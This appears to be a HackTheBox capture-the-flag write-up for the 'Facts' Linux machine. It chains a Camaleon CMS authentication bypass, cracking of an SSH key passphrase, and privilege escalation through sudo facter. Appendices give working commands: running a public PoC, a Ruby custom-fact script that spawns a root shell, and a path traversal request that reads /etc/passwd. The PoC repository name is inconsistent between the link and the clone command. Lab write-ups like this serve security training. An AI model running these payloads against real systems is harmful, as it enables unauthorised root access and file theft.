---
MOC: "[[HackTheBox Writeups]]"
tags:
  - "#writeup"
URL: https://app.hackthebox.com/machines/Facts
Category: Linux
socialImage: "[[Facts.png]]"
---
-- --
# Executive Summary
Because anyone can create a website account, a vulnerability with the version of Camaleon CMS allows them to gain control over the website. By using the stored credentials in the website they can connect to the machine as the website user, where they can gain control over the entire machine.

# Attack Path

| ID                                                              | Component    | Risk     | Type                  |
| --------------------------------------------------------------- | ------------ | -------- | --------------------- |
| [CVE-2025-2304](https://www.cve.org/CVERecord?id=CVE-2025-2304) | Camaleon CMS | Critical | Authentication bypass |
| [CVE-2026-1776](https://www.cve.org/CVERecord?id=CVE-2026-1776) | Camaleon CMS | Medium   | Path traversal        |
| N/A                                                             | System       | High     | Privilege escalation  |
## Initial Access
The attacker registers a standard user account on the public Camaleon CMS instance.
## Application Privilege Escalation
Using [CVE-2025-2304](https://www.cve.org/CVERecord?id=CVE-2025-2304), the attacker escalates from a standard user to an administrative account within Camaleon CMS, gaining control and view over the website configuration (See Appendix A). 
## Credential Access
With administrative access, the attacker uses secrets for the local AWS bucket to connect. The bucket contains a SSH private key for a local user. While the key is protected by a passphrase, the passphrase can be cracked from the brute-forced offline. 
## System Access
The attacker uses the cracked passphrase and key to authenticate as the local user over SSH.
## System Privilege Escalation
All users can execute `/usr/bin/facter` as root. `facter` allows execution of custom Ruby scripts, which can be used to spawn a root shell and full system compromise (See Appendix B).
# Impact
By following this attack chain, an attacker can reach system-level control over both the web application and underlying machine. This can include the following.
- Modifying website content and configuration
- Accessing sensitive information on the host
- Maintaining persistence
# Reference
## Appendix A
The [d3vn0mi PoC](https://github.com/d3vn0mi/cve-2025-2304-poc) can be used to exploit [CVE-2025-2304](https://www.cve.org/CVERecord?id=CVE-2025-2304).
```shell
git clone https://github.com/d3vhthnnni/cve-2025-2304-poc.git
cd cve-2025-2304-poc
python3 -m venv venv
./venv/bin/pip3 install -r requirements.txt
./venv/bin/python3 cve-2025-2304-poc.py http:\\facts.htb -u <username> -p <password> -v
```
## Appendix B
The following can be used for to escalate privileges using `/usr/bin/facter`.

```shell
mkdir -p /tmp/custom_facts

cat > /tmp/custom_facts/root_shell.rb << 'EOF'
Facter.add(:root_shell) do
  setcode do
    system('bash -p')
    'owned'
  end
end
EOF

sudo /usr/bin/facter --custom-dir=/tmp/custom_facts root_shell
```

## Appendix C
While it should be patched by even the current version of Camaleon CMS, the website is still vulnerable to directory traversal with [CVE-2026-1776](https://www.cve.org/CVERecord?id=CVE-2026-1776), allowing anyone to  read arbitrarily files on the host that the website user can read.

```shell
curl -O http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```